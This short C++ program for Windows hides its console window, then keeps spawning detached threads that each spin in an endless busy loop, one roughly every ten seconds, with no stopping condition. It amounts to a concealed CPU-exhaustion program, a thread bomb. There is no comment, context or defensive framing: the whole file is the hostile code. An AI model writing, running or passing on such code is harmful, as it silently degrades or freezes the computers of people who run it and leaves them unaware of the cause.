#include <bits/stdc++.h>
#include <windows.h>
using namespace std;

WINBOOL HideConsole()
{
	HWND hwndc = GetConsoleWindow();
	return ShowWindow(hwndc, SW_HIDE);
}
void w()
{
	while (1)
		;
}
int main()
{
	HideConsole();
	while (1)
	{
		thread s(w);
		sleep(10);
		s.detach();
	}
	return 0;
}